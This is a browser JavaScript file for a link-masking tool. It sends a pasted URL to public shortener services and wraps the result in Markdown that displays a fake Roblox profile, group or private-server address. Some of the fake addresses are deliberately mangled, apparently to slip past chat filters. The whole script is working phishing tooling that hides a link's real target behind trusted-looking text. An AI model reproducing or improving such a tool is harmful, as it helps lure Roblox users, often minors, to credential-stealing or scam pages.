const serviceButtons = document.querySelectorAll('.shortener-btn');
let selectedService = "clickru"; // default recommended

serviceButtons.forEach(btn => {
  btn.addEventListener('click', () => {
    selectedService = btn.dataset.service;
    alert(`${selectedService} selected`);
  });
});

const input = document.getElementById("userLink");
const typeSelect = document.getElementById("linkType");
const resultDiv = document.getElementById("result");
const generateBtn = document.getElementById("generateBtn");
const copyBtn = document.getElementById("copyBtn");
const viewBtn = document.getElementById("viewBtn");

generateBtn.addEventListener("click", async () => {
  const link = input.value.trim();
  const type = typeSelect.value;
  if(!link) return alert("Please paste a link!");

  let shortLink = "";
  try {
    if(selectedService === "clickru") {
      const res = await fetch(`https://clck.ru/--?url=${encodeURIComponent(link)}`);
      shortLink = await res.text();
    } else if(selectedService === "isgd") {
      const res = await fetch(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(link)}`);
      shortLink = await res.text();
    } else if(selectedService === "vgd") {
      const res = await fetch(`https://v.gd/create.php?format=simple&url=${encodeURIComponent(link)}`);
      shortLink = await res.text();
    } else if(selectedService === "tinyurl") {
      const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(link)}`);
      shortLink = await res.text();
    } else if(selectedService === "dagd") {
      const res = await fetch(`https://da.gd/s?url=${encodeURIComponent(link)}`);
      shortLink = await res.text();
    } else if(selectedService === "shrtco") {
      const res = await fetch(`https://api.shrtco.de/v2/shorten?url=${encodeURIComponent(link)}`);
      const data = await res.json();
      shortLink = data.ok ? data.result.full_short_link : "";
    }

    if(!shortLink) throw new Error("Shortening failed");

    let finalLink = "";
    if(type === "profile") {
      finalLink = `[https*:*//www.roblox.com/users/3095250/profile](${shortLink})`;
    } else if(type === "group") {
      finalLink = `[www.roblox.com/groups/2194003353](${shortLink})`;
    } else if(type === "private") {
      finalLink = `[https_:_//www.roblox.com/share?code=80177c63cdc8614aa84be3cbd84b051a&type=Server](${shortLink})`;
    }

    resultDiv.innerText = finalLink;
    viewBtn.href = shortLink;

  } catch(err) {
    console.error(err);
    alert("Error shortening link. Try another shortener!");
  }
});

copyBtn.addEventListener("click", () => {
  const text = resultDiv.innerText;
  navigator.clipboard.writeText(text).then(() => {
    alert("Copied!");
  });
});
